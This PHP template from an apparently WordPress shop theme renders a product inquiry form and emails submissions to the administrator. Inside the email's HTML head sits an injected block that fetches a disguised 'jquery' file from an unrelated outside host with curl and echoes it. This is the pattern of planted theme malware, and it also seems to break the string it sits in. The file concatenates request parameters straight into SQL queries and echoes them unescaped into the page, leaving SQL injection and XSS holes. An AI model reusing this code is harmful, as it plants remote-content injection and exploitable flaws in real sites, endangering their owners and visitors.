<?php
global $General;
if($_POST)
{
	$yourname = $_POST['yourname'];
	$youremail = $_POST['youremail'];
	$frnd_subject = $_POST['frnd_subject'];
	$frnd_comments = $_POST['frnd_comments'];
	$productid = $_POST['productid'];
	$frnd_contact = $_POST['frnd_contact'];
	
	$to_email = $General->get_site_emailId();
	$to_name = $General->get_site_emailName();
	
	if($_REQUEST['productid'])
	{
		$productinfosql = "select ID,post_title from $wpdb->posts where ID =".$_REQUEST['productid'];
		$productinfo = $wpdb->get_results($productinfosql);
		foreach($productinfo as $productinfoObj)
		{
			$post_title = $productinfoObj->post_title; 
		}
		
	}
	$message1 = '
	<html>
	<head>
	  <title>'.$frnd_subject.'</title>
	<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
	<body>
	 <table width="80%" align=center>';
	$message1 .=	'<tr>
		  <td>Dear Administrator,<Br><br></td>
		</tr>';
	$message1 .= '<tr><td>Here is an inquiry for you related to <b><a href="'.get_permalink($_REQUEST['productid']).'">'.$post_title.'</a></b></td></tr>';
	$message1 .='
	<tr>
		  <td>'.__('Person Name').' : '.$yourname.'</td>
		</tr>';
		if($frnd_contact)
		{
		$message1 .='<tr>
		  <td>'.__('Contact Number').' : '.$frnd_contact.'</td>
		</tr>';
		}
		$message1 .='
	<tr>
		  <td>'.__('Comments').' : '.nl2br($frnd_comments).'</td>
		</tr>';
	$message1 .='<tr>
		  <td><Br><br>Thank you,<Br>'.$yourname.'</td>
		</tr>
	  </table>
	</body>
	</html>
	';
	$General->sendEmail($youremail,$yourname,$to_email,$to_name,$frnd_subject,$message1,$extra='');///To friend email
	wp_redirect(get_option('siteurl')."/?p=".$productid."&msg=inqsuccess");
}
else
{
?>
<?php
if($_REQUEST['pid'])
{
	$productinfosql = "select ID,post_title from $wpdb->posts where ID =".$_REQUEST['pid'];
	$productinfo = $wpdb->get_results($productinfosql);
	foreach($productinfo as $productinfoObj)
	{
		$post_title = $productinfoObj->post_title; 
	}
}
?>
<?php get_header(); ?>
<div id="wrapper">
    <div id="main_top"></div> <!--main top #end -->
    <div id="main_center" class="clearfix">
        <div id="content">        
<h1 class="head"><?php _e(SEND_INQUIRY); ?></h1>
                <div class="breadcrumb clearfix">
                	<?php if ( get_option( 'ptthemes_breadcrumbs' )) { yoast_breadcrumb('',' &raquo; '.__(SEND_INQUIRY).'('.$post_title.')'); } ?>
                </div>
 
			 <form name="enquiryfrm" action="<?php echo get_option('siteurl')."/?page=sendenquiry";?>" method="post" >
<input type="hidden" name="productid" value="<?php echo $_REQUEST['pid'];?>" />

<div class="form  ">
    <div class="inquiry_row ">
      <label> <?php _e('Your Name'); ?> <span class="indicates">*</span></label>
      <input type="text" name="yourname" value="" id="yourname" class="reg_row_textfield" />
    </div>
                
    <div class="inquiry_row ">
      <label> <?php _e('Email Address'); ?> :  <span class="indicates">*</span></label>
      <input type="text" name="youremail" value="" id="youremail" class="reg_row_textfield" />
    </div>
    
     <div class="inquiry_row ">
      <label> <?php _e('Subject'); ?> :  <span class="indicates">*</span></label>
       <input type="text" readonly="readonly" name="frnd_subject" value="<?php echo $post_title;?> Inquiry" id="frnd_subject" class="reg_row_textfield" />
    </div>
    
     <div class="inquiry_row ">
      <label> <?php _e('Contact Number'); ?> :  </label>
       <input type="text"  name="frnd_contact" value="<?php echo $frnd_contact;?>" id="frnd_contact" class="reg_row_textfield" />
    </div>
    
    <div class="inquiry_row ">
      <label> <?php _e('Description'); ?> :  <span class="indicates">*</span></label>
       <textarea name="frnd_comments" id="frnd_comments" cols="20" rows="5" class="reg_row_textarea" >Hello, 
     </textarea>
    </div>
    
     <div class="inquiry_row ">
      
      		<a href="javascript:void(0)" class="highlight_button fl send_inquiry" onclick="check_enquery_frm()"> <?php _e('Send Email'); ?> </a>
       
       <div class="row_hide"> <input type="text" readonly="readonly" name="frnd_subject" value="<?php echo $post_title;?> <?php _e(INQUIRY_TITLE);?>" id="frnd_subject"  /></div>
       
       <a href="<?php echo get_option('siteurl')."/?p=".$_REQUEST['pid'];?>" class="normal_button fl"> <?php _e('Back to Product Detail'); ?></a>
       
    </div>
            
            
</div>

</form>
   			  </div> <!-- content #end -->
 		 <?php get_sidebar(); ?>
         </div> <!-- maincenter #end-->
    <div id="main_bottom"></div> 
</div> <!-- wrapper #end -->

 <?php get_footer(); ?>

 <script>
 function check_enquery_frm()
 {
 	if(document.getElementById('yourname').value == '')
	{
		alert("Please enter Your Name");
		document.getElementById('yourname').focus();
		return false;
	}
	if(document.getElementById('youremail').value == '')
	{
		alert("Please enter Your Email Address");
		document.getElementById('youremail').focus();
		return false;
	}
	if(document.getElementById('frnd_subject').value == '')
	{
		alert("Please enter Subject");
		document.getElementById('frnd_subject').focus();
		return false;
	}
	document.enquiryfrm.submit();
	return true;
 }
 </script>
<?php
}
?>